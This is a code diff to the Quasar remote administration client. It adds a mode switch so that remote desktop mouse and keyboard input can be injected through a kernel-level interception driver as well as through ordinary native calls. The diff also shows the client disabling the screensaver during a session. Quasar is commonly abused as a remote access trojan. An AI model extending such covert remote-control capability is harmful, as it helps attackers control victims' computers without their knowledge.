@@ -149,25 +149,51 @@ namespace Quasar.Client.Messages
                         break;
                 }
 
-                switch (message.Action)
+                if (message.mode == RemoteDesktopMode.Normal)
                 {
-                    case MouseAction.LeftDown:
-                    case MouseAction.LeftUp:
-                        NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
-                        break;
-                    case MouseAction.RightDown:
-                    case MouseAction.RightUp:
-                        NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
-                        break;
-                    case MouseAction.MoveCursor:
-                        NativeMethodsHelper.DoMouseMove(p);
-                        break;
-                    case MouseAction.ScrollDown:
-                        NativeMethodsHelper.DoMouseScroll(p, true);
-                        break;
-                    case MouseAction.ScrollUp:
-                        NativeMethodsHelper.DoMouseScroll(p, false);
-                        break;
+                    switch (message.Action)
+                    {
+                        case MouseAction.LeftDown:
+                        case MouseAction.LeftUp:
+                            NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
+                            break;
+                        case MouseAction.RightDown:
+                        case MouseAction.RightUp:
+                            NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
+                            break;
+                        case MouseAction.MoveCursor:
+                            NativeMethodsHelper.DoMouseMove(p);
+                            break;
+                        case MouseAction.ScrollDown:
+                            NativeMethodsHelper.DoMouseScroll(p, true);
+                            break;
+                        case MouseAction.ScrollUp:
+                            NativeMethodsHelper.DoMouseScroll(p, false);
+                            break;
+                    }
+                }
+                else
+                {
+                    switch (message.Action)
+                    {
+                        case MouseAction.LeftDown:
+                        case MouseAction.LeftUp:
+                            InterceptionHelper.KernelDoMouseLeftClick(p, message.IsMouseDown);
+                            break;
+                        case MouseAction.RightDown:
+                        case MouseAction.RightUp:
+                            InterceptionHelper.KernelDoMouseRightClick(p, message.IsMouseDown);
+                            break;
+                        case MouseAction.MoveCursor:
+                            InterceptionHelper.KernelDoMouseMove(p);
+                            break;
+                        case MouseAction.ScrollDown:
+                            InterceptionHelper.KernelDoMouseScroll(p, true);
+                            break;
+                        case MouseAction.ScrollUp:
+                            InterceptionHelper.KernelDoMouseScroll(p, false);
+                            break;
+                    }
                 }
             }
             catch
@@ -180,8 +206,10 @@ namespace Quasar.Client.Messages
             if (NativeMethodsHelper.IsScreensaverActive())
                 NativeMethodsHelper.DisableScreensaver();
 
-            InterceptionHelper.KenelKeyPress(message.Key, message.KeyDown);
-            //NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
+            if(message.mode == RemoteDesktopMode.Normal)
+                NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
+            else
+                InterceptionHelper.KenelKeyPress(message.Key, message.KeyDown);
         }
 
         private void Execute(ISender client, GetMonitors message)
